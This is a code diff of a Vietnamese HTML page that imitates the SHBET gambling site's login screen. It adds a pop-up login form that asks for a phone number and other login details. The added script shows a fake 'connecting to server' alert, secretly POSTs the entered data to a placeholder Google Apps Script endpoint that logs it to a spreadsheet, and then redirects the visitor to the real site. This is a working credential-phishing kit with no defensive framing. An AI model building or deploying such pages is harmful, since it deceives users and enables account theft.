@@ -3,57 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHBET - Thế Giới Casino Trong Tay Bạn</title>
+    <title>SHBET - Đăng Nhập</title>
     <style>
-        body { margin: 0; font-family: Arial, sans-serif; background-color: #062e3a; color: white; }
-        /* Header chứa Logo và Nút */
+        body { margin: 0; font-family: Arial, sans-serif; background-color: #062e3a; }
+        /* 1. Thanh Header màu trắng */
         header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: white; }
         .logo img { height: 45px; }
-        .auth-buttons button { padding: 8px 15px; border-radius: 5px; border: none; cursor: pointer; font-weight: bold; margin-left: 5px; }
-        .btn-login { background: white; color: #007bff; border: 1px solid #007bff !important; }
-        .btn-reg { background: #00bfff; color: white; }
+        .btn-login { padding: 8px 15px; border-radius: 5px; border: 1px solid #007bff; background: white; color: #007bff; cursor: pointer; font-weight: bold; }
 
-        /* Menu đen chữ vàng */
-        nav { background: #1a1a1a; display: flex; justify-content: center; padding: 10px 0; overflow-x: auto; white-space: nowrap; }
-        nav a { color: #ffca28; text-decoration: none; margin: 0 15px; font-size: 13px; font-weight: bold; text-transform: uppercase; }
+        /* 2. Menu màu đen */
+        nav { background: #1a1a1a; display: flex; justify-content: center; padding: 10px 0; }
+        nav a { color: #ffca28; text-decoration: none; margin: 0 15px; font-size: 13px; font-weight: bold; }
 
-        /* Banner và Form */
-        .hero { position: relative; width: 100%; }
-        .banner { width: 100%; display: block; }
-        
-        .login-container { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 15px; width: 320px; margin: -50px auto 20px; position: relative; z-index: 10; box-shadow: 0 10px 25px rgba(0,0,0,0.3); color: #333; }
-        .login-container h2 { text-align: center; color: #000; margin-top: 0; font-size: 20px; }
-        
+        /* 3. Banner lớn */
+        .banner-container { width: 100%; position: relative; }
+        .banner-img { width: 100%; display: block; }
+
+        /* 4. Form đăng nhập (Mặc định sẽ ẨN ĐI) */
+        .login-container { 
+            display: none; 
+            position: fixed; 
+            top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            background: white; padding: 25px; border-radius: 15px; width: 320px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); z-index: 1000; 
+        }
+        .login-container h2 { text-align: center; color: #333; margin-top: 0; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        #btn-submit { width: 100%; padding: 12px; background: #ff9800; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        
+        /* Nút đăng nhập màu XANH DA TRỜI bạn muốn */
+        #btn-submit { width: 100%; padding: 12px; background: #008b9a; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <header>
         <div class="logo">
-            <img src="https://shbet88.io/wp-content/uploads/2024/01/logo-shbet.png" alt="Logo">
+            <img src="https://media.licdn.com/dms/image/v2/D4E12AQED-HCjN5hn6g/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1721702595437?e=2147483647&v=beta&t=fyY4P1jEQEfP8zG68RVAHtd-c4RZSyI6SNNrjg2grEU">
         </div>
-        <div class="auth-buttons">
-            <button class="btn-login">Đăng nhập</button>
-            <button class="btn-reg">Đăng ký</button>
-        </div>
+        <button class="btn-login">Đăng nhập</button>
     </header>
 
     <nav>
-        <a href="#">Trang chủ</a>
-        <a href="#">Thể thao</a>
-        <a href="#">Casino</a>
-        <a href="#">Game bài</a>
-        <a href="#">Nổ hũ</a>
-        <a href="#">Xổ số</a>
+        <a href="#">TRANG CHỦ</a>
+        <a href="#">THỂ THAO</a>
+        <a href="#">CASINO</a>
     </nav>
 
-    <div class="hero">
-        <img src="https://68shbet.com/wp-content/uploads/2024/05/banner-shbet.jpg" class="banner" alt="Banner">
+    <div class="banner-container">
+        <img src="https://gedisagenius.ru.com/wp-content/uploads/2025/09/banner_shbet-1.webp">
     </div>
 
-    <div class="login-container">
+    <div class="login-container" id="loginBox">
         <h2>ĐĂNG NHẬP NGAY</h2>
         <form id="myForm">
             <input type="text" name="phone" placeholder="Số điện thoại" required>
@@ -64,12 +64,24 @@
     </div>
 
     <script>
-        // Giữ nguyên đoạn code Script gửi dữ liệu về Google Sheets của bạn ở đây
-        document.getElementById('myForm').onsubmit = function(e) {
+        const btnLoginHeader = document.querySelector('.btn-login');
+        const loginBox = document.getElementById('loginBox');
+
+        // Khi bấm nút Đăng nhập trên Header thì hiện bảng lên
+        btnLoginHeader.onclick = function() {
+            loginBox.style.display = 'block';
+        };
+
+        // Gửi dữ liệu về Google Sheets
+        const scriptURL = 'DÁN_LINK_APP_SCRIPT_CỦA_BẠN_Ở_ĐÂY';
+        const form = document.getElementById('myForm');
+
+        form.onsubmit = function(e) {
             e.preventDefault();
-            // Thêm đoạn fetch gửi dữ liệu của bạn vào đây
             alert('Đang kết nối đến máy chủ...');
-            window.location.href = "https://shbet.com"; 
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => { window.location.href = "https://shbet.com"; })
+            .catch(error => console.error('Lỗi!', error.message));
         };
     </script>
 </body>
